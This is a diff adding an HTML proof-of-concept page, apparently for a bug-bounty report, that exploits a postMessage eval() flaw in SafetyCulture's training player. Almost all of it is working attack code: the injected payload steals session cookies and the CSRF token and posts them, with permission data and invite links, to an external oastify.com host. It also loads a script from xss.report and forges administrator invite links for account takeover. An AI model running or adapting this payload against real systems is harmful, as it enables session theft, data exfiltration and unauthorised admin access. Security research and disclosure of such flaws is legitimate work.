@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html>
+<head><title>SafetyCulture postMessage eval() → 1-Click Admin ATO</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a1a;color:#e0e0e0;padding:20px;min-height:100vh}
+.header{text-align:center;padding:20px 0 30px;border-bottom:2px solid #1a1a3e}
+.header h1{font-size:28px;color:#ff4444;margin-bottom:8px;letter-spacing:1px}
+.header .subtitle{color:#888;font-size:14px}
+.header .origin-badge{display:inline-block;margin-top:10px;padding:6px 16px;background:#1a1a3e;border:1px solid #333;border-radius:20px;font-family:monospace;font-size:13px;color:#4fc3f7}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:20px}
+.card{background:#111128;border:1px solid #222;border-radius:12px;padding:16px;overflow:hidden}
+.card.full{grid-column:1/-1}
+.card h2{font-size:14px;text-transform:uppercase;letter-spacing:2px;color:#666;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.card h2 .dot{width:8px;height:8px;border-radius:50%;display:inline-block}
+.dot.red{background:#ff4444}.dot.green{background:#00e676}.dot.yellow{background:#ffd600}.dot.blue{background:#448aff}
+.badge{display:inline-block;padding:3px 10px;border-radius:4px;font-size:11px;font-weight:700;font-family:monospace}
+.badge.critical{background:#ff1744;color:#fff}
+.badge.success{background:#00c853;color:#fff}
+.badge.info{background:#2979ff;color:#fff}
+.badge.warn{background:#ff9100;color:#000}
+.val{font-family:monospace;font-size:13px;word-break:break-all;line-height:1.7;color:#b0bec5}
+.val .label{color:#78909c;font-size:11px;display:block;margin-top:8px;text-transform:uppercase;letter-spacing:1px}
+.val .highlight{color:#fff;background:#1a237e;padding:2px 6px;border-radius:3px}
+.val .secret{color:#ff8a80;font-weight:700}
+.cookie-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:8px}
+.cookie-item{background:#0d0d20;border:1px solid #1a1a3e;border-radius:6px;padding:8px 10px;font-family:monospace;font-size:11px;word-break:break-all}
+.cookie-item .ck-name{color:#ffd600;font-weight:700;display:block;margin-bottom:2px}
+.cookie-item .ck-val{color:#90a4ae}
+.cookie-item .ck-flags{color:#546e7a;font-size:10px;margin-top:4px;display:block}
+.timeline{list-style:none;padding:0}
+.timeline li{padding:8px 0 8px 24px;border-left:2px solid #222;position:relative;font-size:13px}
+.timeline li:before{content:'';width:10px;height:10px;border-radius:50%;background:#333;position:absolute;left:-6px;top:12px}
+.timeline li.done:before{background:#00e676}
+.timeline li.active:before{background:#ffd600;box-shadow:0 0 8px #ffd600}
+.timeline li.error:before{background:#ff1744}
+.progress-bar{height:4px;background:#1a1a3e;border-radius:2px;margin:12px 0;overflow:hidden}
+.progress-bar .fill{height:100%;background:linear-gradient(90deg,#ff4444,#ff9100,#ffd600,#00e676);border-radius:2px;transition:width 0.5s}
+.invite-box{background:#1b5e20;border:2px solid #00e676;border-radius:8px;padding:16px;margin-top:12px;text-align:center}
+.invite-box .link{font-size:14px;color:#69f0ae;word-break:break-all;font-family:monospace;margin:8px 0}
+.invite-box .copy-hint{font-size:11px;color:#81c784}
+.hexdump{font-family:monospace;font-size:11px;color:#546e7a;background:#050510;padding:10px;border-radius:6px;max-height:120px;overflow-y:auto;word-break:break-all;margin-top:8px}
+.popup-btn{display:none;padding:12px 32px;font-size:16px;background:#ff4444;color:#fff;border:none;border-radius:8px;cursor:pointer;margin:20px auto;font-weight:700}
+.popup-btn:hover{background:#ff1744}
+#status-line{text-align:center;margin-top:12px;font-size:13px;color:#ffd600}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>SafetyCulture 1-Click Admin ATO</h1>
+  <div class="subtitle">postMessage eval() DOM XSS in player.html → Full Administrator Escalation via Invite Link</div>
+  <div class="origin-badge" id="origin-badge">Origin: loading...</div>
+  <div id="status-line">Initializing...</div>
+  <div class="progress-bar"><div class="fill" id="progress" style="width:0%"></div></div>
+  <button class="popup-btn" id="popup-btn">Launch Exploit</button>
+</div>
+
+<div class="grid" id="grid"></div>
+
+<script>
+var G = document.getElementById('grid');
+var PB = document.getElementById('progress');
+var SL = document.getElementById('status-line');
+var OB = document.getElementById('origin-badge');
+var evalFired = false;
+var results = {};
+var stepsDone = 0;
+var totalSteps = 7;
+
+OB.textContent = 'Attacker Origin: ' + location.origin;
+
+function pct() { stepsDone++; PB.style.width = Math.min(100, Math.round(stepsDone/totalSteps*100)) + '%'; }
+function setStatus(t) { SL.textContent = t; }
+
+function addCard(id, title, dotColor, content, full) {
+  var existing = document.getElementById('card-' + id);
+  if (existing) { existing.querySelector('.card-body').innerHTML = content; return; }
+  var c = document.createElement('div');
+  c.className = 'card' + (full ? ' full' : '');
+  c.id = 'card-' + id;
+  c.innerHTML = '<h2><span class="dot ' + dotColor + '"></span>' + title + '</h2><div class="card-body">' + content + '</div>';
+  G.appendChild(c);
+}
+
+function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+function parseCookies(cookieStr) {
+  if (!cookieStr) return '<span class="val">No cookies captured</span>';
+  var parts = cookieStr.split(';');
+  var html = '<div class="cookie-grid">';
+  parts.forEach(function(p) {
+    p = p.trim(); if (!p) return;
+    var eq = p.indexOf('=');
+    var name = eq > 0 ? p.substring(0, eq).trim() : p;
+    var val = eq > 0 ? p.substring(eq + 1) : '';
+    var isSensitive = /session|crumb|csrf|token|auth|jwt/i.test(name);
+    html += '<div class="cookie-item"><span class="ck-name">' + esc(name) + '</span><span class="ck-val' + (isSensitive ? ' secret' : '') + '">' + esc(val.substring(0, 120)) + (val.length > 120 ? '...' : '') + '</span>';
+    if (isSensitive) html += '<span class="ck-flags">SENSITIVE — Session Token</span>';
+    html += '</div>';
+  });
+  return html + '</div>';
+}
+
+// ─── Launch ───
+setStatus('Opening player.html popup...');
+var win = window.open('https://app.au.safetyculture.com/training/engine/player.html', 'sc_engine');
+
+if (!win) {
+  setStatus('Popup blocked — click the button');
+  var btn = document.getElementById('popup-btn');
+  btn.style.display = 'block';
+  btn.onclick = function() {
+    win = window.open('https://app.au.safetyculture.com/training/engine/player.html', 'sc_engine');
+    if (win) { btn.style.display = 'none'; startExploit(); }
+  };
+} else {
+  startExploit();
+}
+
+function startExploit() {
+  setStatus('Waiting 5s for player.html JS to load...');
+  pct();
+
+  addCard('timeline', 'Attack Timeline', 'yellow',
+    '<ul class="timeline" id="timeline"><li class="done"><span class="ts">' + new Date().toLocaleTimeString() + '</span> <span class="msg">Popup opened — player.html loading</span></li></ul>', true);
+
+  setTimeout(function() {
+    setStatus('Sending eval() payload via postMessage...');
+    tlAdd('Sending eval() payload via postMessage');
+    pct();
+
+    var payload = ''
+      + 'var OP=window.opener;'
+      + 'function rpt(a,d){try{OP.postMessage({type:"r",api:a,data:typeof d==="string"?d:JSON.stringify(d)},"*")}catch(e){}}'
+
+      // ── Protobuf helpers ──
+      + 'function pbStr(fn,v){var e=new TextEncoder().encode(v);var r=[(fn<<3)|2];var l=e.length;while(l>127){r.push((l&0x7f)|0x80);l>>=7}r.push(l);for(var i=0;i<e.length;i++)r.push(e[i]);return r}'
+      + 'function pbVarint(fn,v){return[(fn<<3)|0,v]}'
+      + 'function grpcWrap(pb){var len=pb.length;return new Uint8Array([0,(len>>24)&0xff,(len>>16)&0xff,(len>>8)&0xff,len&0xff].concat(pb))}'
+
+      // ── Step 1: Steal cookies + CSRF ──
+      + 'var allCookies=document.cookie;'
+      + 'var crumb="";try{var cm=document.cookie.match(/safetyculture_session_crumb=([^;]+)/);if(cm)crumb=cm[1]}catch(e){}'
+      + 'rpt("COOKIES",allCookies);'
+      + 'rpt("EVAL-FIRED",JSON.stringify({origin:location.origin,url:location.href,cookieLen:allCookies.length,crumb:crumb,userAgent:navigator.userAgent,timestamp:new Date().toISOString()}));'
+      + 'fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-cookies",{method:"POST",mode:"no-cors",body:allCookies}).catch(function(){});'
+      + 'var sc=document.createElement("script");sc.src="https://xss.report/c/ninjamee";document.head.appendChild(sc);'
+
+      // ── Step 2: Discover Administrator UUID from ListPermissionSets ──
+      + 'var grpcH={"Content-Type":"application/grpc-web+proto","X-Grpc-Web":"1","X-User-Agent":"connect-es/2.1.2"};'
+      + 'var emptyProto=new Uint8Array([0,0,0,0,0]);'
+      + 'var ADMIN_UUID=null;'
+
+      + 'fetch("/api/v3/s12.permissions.v1.PermissionsService/ListPermissionSets",{'
+      + '  method:"POST",headers:grpcH,credentials:"include",body:emptyProto'
+      + '}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '  var bytes=new Uint8Array(buf);var t="";for(var i=0;i<bytes.length;i++)t+=String.fromCharCode(bytes[i]);'
+      + '  var uuids=t.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g);'
+      + '  rpt("PERM-UUIDS",JSON.stringify({count:uuids?uuids.length:0,uuids:uuids}));'
+      + '  var ai=t.toLowerCase().indexOf("dministrator");'
+      + '  if(ai>0){var chunk=t.substring(Math.max(0,ai-200),ai+50);'
+      + '    var nearUUID=chunk.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g);'
+      + '    if(nearUUID){ADMIN_UUID=nearUUID[nearUUID.length-1];rpt("ADMIN-UUID",ADMIN_UUID)}'
+      + '  }'
+      + '  if(!ADMIN_UUID&&uuids&&uuids.length>0){ADMIN_UUID=uuids[0];rpt("ADMIN-UUID-FALLBACK",ADMIN_UUID)}'
+      + '  var hex="";for(var j=0;j<Math.min(bytes.length,3000);j++)hex+=("0"+bytes[j].toString(16)).slice(-2);'
+      + '  rpt("PERMS-HEX",hex);'
+      + '  fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-perms",{method:"POST",mode:"no-cors",body:hex}).catch(function(){});'
+
+      // ── Step 3: Create Admin invite link — new seat_type field guesses ──
+      + '  if(!ADMIN_UUID){rpt("NO-ADMIN-UUID","cannot create invite");return}'
+      + '  var crumb2="";try{var cm2=document.cookie.match(/safetyculture_session_crumb=([^;]+)/);if(cm2)crumb2=cm2[1]}catch(e){}'
+      + '  var grpcHC={"Content-Type":"application/grpc-web+proto","X-Grpc-Web":"1","X-User-Agent":"connect-es/2.1.2"};'
+      + '  if(crumb2)grpcHC["X-CSRF-Token"]=crumb2;'
+
+      // Helper: create invite + parse response for invite ID, then modify seat_type
+      + '  function createAndModify(name,createPb,label){'
+      + '    return fetch("/api/v3/s12.accounts.invite.v1.InviteService/CreateOrganisationInviteLink",{'
+      + '      method:"POST",headers:grpcHC,credentials:"include",body:grpcWrap(createPb)'
+      + '    }).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '      var bytes=new Uint8Array(buf);var t="";for(var i=0;i<bytes.length;i++)t+=String.fromCharCode(bytes[i]);'
+      + '      var link=t.match(/https:\\/\\/app[^\\x00-\\x1f]*/);'
+      + '      var invId=t.match(/[A-Z]{2}[a-f0-9]{32}/);'
+      + '      var hex="";for(var j=0;j<Math.min(bytes.length,2000);j++)hex+=("0"+bytes[j].toString(16)).slice(-2);'
+      + '      rpt("INVITE-"+name,JSON.stringify({label:label,url:link?link[0]:null,invId:invId?invId[0]:null,hex:hex,len:bytes.length}));'
+      + '      if(link){fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-invite-"+name,{method:"POST",mode:"no-cors",body:link[0]}).catch(function(){})}'
+      + '      return {url:link?link[0]:null,invId:invId?invId[0]:null,raw:t};'
+      + '    }).catch(function(e){rpt("INVITE-"+name+"-ERR",""+e);return null});'
+      + '  }'
+
+      // Attempt A: field2=1 (PREMIUM might be enum 1)
+      + '  var invA=pbStr(1,"XSS-Admin-F2V1").concat(pbVarint(2,1)).concat(pbVarint(3,1)).concat(pbVarint(5,1)).concat(pbStr(7,ADMIN_UUID));'
+      + '  createAndModify("A",invA,"f2=1 (PREMIUM?)");'
+
+      // Attempt B: field8=1 (seat_type might be field 8)
+      + '  var invB=pbStr(1,"XSS-Admin-F8V1").concat(pbVarint(3,1)).concat(pbVarint(5,1)).concat(pbStr(7,ADMIN_UUID)).concat(pbVarint(8,1));'
+      + '  createAndModify("B",invB,"f8=1");'
+
+      // Attempt C: field8=2 (seat_type field 8, value 2)
+      + '  var invC=pbStr(1,"XSS-Admin-F8V2").concat(pbVarint(3,1)).concat(pbVarint(5,1)).concat(pbStr(7,ADMIN_UUID)).concat(pbVarint(8,2));'
+      + '  createAndModify("C",invC,"f8=2");'
+
+      // Attempt D: Create as Guest, then ModifyOrganisationInviteLink to set PREMIUM seat
+      + '  var invD=pbStr(1,"XSS-Admin-Modify").concat(pbVarint(3,1)).concat(pbVarint(5,1)).concat(pbStr(7,ADMIN_UUID));'
+      + '  createAndModify("D",invD,"create+modify").then(function(res){'
+      + '    if(!res||!res.invId){rpt("MODIFY-SKIP","no invite ID from create");return}'
+      + '    rpt("MODIFY-ATTEMPT","invId="+res.invId);'
+      // Try ModifyOrganisationInviteLink with seat_type in fields 2,3,8
+      + '    var tryModify=function(fld,val,lbl){'
+      + '      var modPb=pbStr(1,res.invId).concat(pbVarint(fld,val));'
+      + '      return fetch("/api/v3/s12.accounts.invite.v1.InviteService/ModifyOrganisationInviteLink",{'
+      + '        method:"POST",headers:grpcHC,credentials:"include",body:grpcWrap(modPb)'
+      + '      }).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '        var bytes=new Uint8Array(buf);var t="";for(var i=0;i<bytes.length;i++)t+=String.fromCharCode(bytes[i]);'
+      + '        var hex="";for(var j=0;j<Math.min(bytes.length,1000);j++)hex+=("0"+bytes[j].toString(16)).slice(-2);'
+      + '        rpt("MODIFY-"+lbl,JSON.stringify({len:bytes.length,hex:hex,hasError:t.indexOf("grpc-status")>=0&&t.indexOf("grpc-status: 0")<0}));'
+      + '      }).catch(function(e){rpt("MODIFY-"+lbl+"-ERR",""+e)});'
+      + '    };'
+      + '    tryModify(2,1,"f2v1");tryModify(3,1,"f3v1");tryModify(8,1,"f8v1");tryModify(8,2,"f8v2");'
+      + '    tryModify(2,2,"f2v2");tryModify(9,1,"f9v1");tryModify(10,1,"f10v1");'
+      + '  });'
+
+      + '}).catch(function(e){rpt("PERMS-ERR",""+e)});'
+
+      // ── Step 4: Steal existing invite links via ListOrganisationInvites ──
+      // Confirmed method name from Burp proxy history
+      + 'var listPb=pbVarint(2,25).concat(pbVarint(3,1)).concat(pbVarint(4,3)).concat(pbVarint(5,1)).concat(pbStr(6,""));'
+      + 'fetch("/api/v3/s12.accounts.invite.v1.InviteService/ListOrganisationInvites",{'
+      + '  method:"POST",headers:grpcH,credentials:"include",body:grpcWrap(listPb)'
+      + '}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+      + '  var bytes=new Uint8Array(buf);'
+      + '  var t="";for(var i=0;i<bytes.length;i++)t+=String.fromCharCode(bytes[i]);'
+      + '  var links=t.match(/invite\\/organisation\\/[A-Za-z0-9]+/g);'
+      + '  var urls=t.match(/https:\\/\\/app[^\\x00-\\x1f]*/g);'
+      + '  var invIds=t.match(/[A-Z]{2}[a-f0-9]{32}/g);'
+      + '  var hex="";for(var j=0;j<Math.min(bytes.length,3000);j++)hex+=("0"+bytes[j].toString(16)).slice(-2);'
+      + '  rpt("LIST-INVITES",JSON.stringify({len:bytes.length,links:links,urls:urls,invIds:invIds,hex:hex}));'
+      + '  if(links||urls){fetch("https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com/sc-list-invites",{method:"POST",mode:"no-cors",body:JSON.stringify({links:links,urls:urls,invIds:invIds})}).catch(function(){})}'
+      + '}).catch(function(e){rpt("LIST-INVITES-ERR",""+e)});'
+
+      // ── Step 5: Get admin profile for report evidence ──
+      + 'fetch("/api/v2/users/user_c895a5714aa74a3bb0642c895f9a1081",{credentials:"include"}).then(function(r){return r.json()}).then(function(d){'
+      + '  rpt("ADMIN-PROFILE",JSON.stringify({email:d.name,id:d.id,firstname:d.firstname,lastname:d.lastname,roles:d.roles}));'
+      + '}).catch(function(){});'
+    ;
+
+    win.postMessage(payload, '*');
+    var retries = 0;
+    var timer = setInterval(function() {
+      retries++;
+      if (evalFired || retries > 20) { clearInterval(timer); return; }
+      try { win.postMessage(payload, '*'); } catch(e) {}
+    }, 2000);
+  }, 5000);
+}
+
+function tlAdd(msg, cls) {
+  var tl = document.getElementById('timeline');
+  if (!tl) return;
+  var li = document.createElement('li');
+  li.className = cls || 'done';
+  li.innerHTML = '<span class="ts">' + new Date().toLocaleTimeString() + '</span> <span class="msg">' + esc(msg) + '</span>';
+  tl.appendChild(li);
+}
+
+// ─── Message handler ───
+window.addEventListener('message', function(ev) {
+  if (!ev.data || ev.data.type !== 'r') return;
+  evalFired = true;
+  var api = ev.data.api;
+  var data = ev.data.data;
+  results[api] = data;
+
+  switch(api) {
+    case 'COOKIES':
+      pct(); setStatus('Cookies stolen');
+      tlAdd('Session cookies exfiltrated (' + data.length + ' bytes)');
+      addCard('cookies', 'Stolen Session Cookies <span class="badge critical">EXFILTRATED</span>', 'red', parseCookies(data), true);
+      break;
+
+    case 'EVAL-FIRED':
+      pct();
+      try {
+        var info = JSON.parse(data);
+        setStatus('eval() fired in ' + info.origin);
+        addCard('eval', 'XSS Proof — eval() in victim origin', 'green',
+          '<div class="val"><span class="label">Execution Origin</span><span class="highlight">' + esc(info.origin) + '</span>' +
+          '<span class="label">CSRF Token</span><span class="secret">' + esc(info.crumb) + '</span>' +
+          '<span class="label">Cookie Size</span>' + info.cookieLen + ' bytes' +
+          '<span class="label">Timestamp</span>' + esc(info.timestamp) + '</div>');
+      } catch(e) {}
+      break;
+
+    case 'PERM-UUIDS':
+      pct();
+      try {
+        var pu = JSON.parse(data);
+        tlAdd(pu.count + ' permission set UUIDs discovered');
+      } catch(e) {}
+      break;
+
+    case 'ADMIN-UUID':
+      pct(); setStatus('Administrator UUID found: ' + data);
+      tlAdd('Administrator UUID: ' + data, 'active');
+      addCard('admin-uuid', 'Administrator Permission Set <span class="badge critical">FOUND</span>', 'red',
+        '<div class="val"><span class="label">Administrator UUID</span><span class="secret" style="font-size:16px">' + esc(data) + '</span></div>');
+      break;
+
+    case 'ADMIN-UUID-FALLBACK':
+      tlAdd('Using fallback UUID (first in list): ' + data, 'active');
+      break;
+
+    case 'INVITE-A': case 'INVITE-B': case 'INVITE-C': case 'INVITE-D':
+      pct();
+      try {
+        var inv = JSON.parse(data);
+        tlAdd(api + ' (' + inv.label + '): ' + (inv.url ? 'URL created' : 'no URL'), inv.url ? 'active' : 'error');
+        if (inv.url) {
+          addCard('invite-' + api, 'Admin Invite Link Created <span class="badge critical">ATO</span> (' + inv.label + ')', 'red',
+            '<div class="invite-box">' +
+            '<div style="font-size:15px;font-weight:700;color:#69f0ae;margin-bottom:8px">Administrator Invite Link — ' + esc(inv.label) + '</div>' +
+            '<div class="link">' + esc(inv.url) + '</div>' +
+            '<div class="copy-hint">Attacker opens this → joins org as Full-seat Administrator</div>' +
+            '</div>' +
+            '<div class="hexdump">' + esc(inv.hex || '') + '</div>', true);
+        } else {
+          addCard('invite-' + api + '-hex', inv.label + ' Response', 'blue',
+            '<div class="val"><span class="label">' + esc(inv.label) + ' — ' + inv.len + ' bytes</span></div><div class="hexdump">' + esc(inv.hex || '') + '</div>');
+        }
+      } catch(e) { tlAdd(api + ': ' + data); }
+      break;
+
+    case 'ADMIN-PROFILE':
+      try {
+        var ap = JSON.parse(data);
+        addCard('admin', 'Victim Admin Profile <span class="badge warn">PII</span>', 'yellow',
+          '<div class="val"><span class="label">Email</span><span class="secret">' + esc(ap.email || '?') + '</span>' +
+          '<span class="label">User ID</span>' + esc(ap.id || '?') +
+          '<span class="label">Name</span>' + esc((ap.firstname || '') + ' ' + (ap.lastname || '')) +
+          '<span class="label">Roles</span>' + esc(JSON.stringify(ap.roles || [])) + '</div>');
+      } catch(e) {}
+      break;
+
+    default:
+      if (api.startsWith('LIST-')) {
+        try {
+          var ld = JSON.parse(data);
+          if (typeof ld === 'string') { tlAdd(api + ': ' + ld); break; }
+          tlAdd(api + ': ' + ld.len + ' bytes, links=' + JSON.stringify(ld.links), ld.links ? 'active' : 'done');
+          if (ld.links && ld.links.length > 0) {
+            var linksHtml = '';
+            ld.links.forEach(function(l) {
+              var fullUrl = 'https://app.au.safetyculture.com/' + l;
+              linksHtml += '<div class="invite-box"><div class="link">' + esc(fullUrl) + '</div></div>';
+            });
+            addCard('stolen-links', 'Stolen Invite Links <span class="badge critical">ATO</span>', 'red', linksHtml, true);
+          }
+          if (ld.hex) addCard('list-hex-' + api, api + ' Raw', 'blue', '<div class="hexdump">' + esc(ld.hex) + '</div>');
+        } catch(e) { tlAdd(api + ': ' + data); }
+      } else {
+        tlAdd('[' + api + '] ' + (typeof data === 'string' ? data.substring(0, 300) : JSON.stringify(data).substring(0, 300)));
+      }
+  }
+});
+</script>
+</body>
+</html>
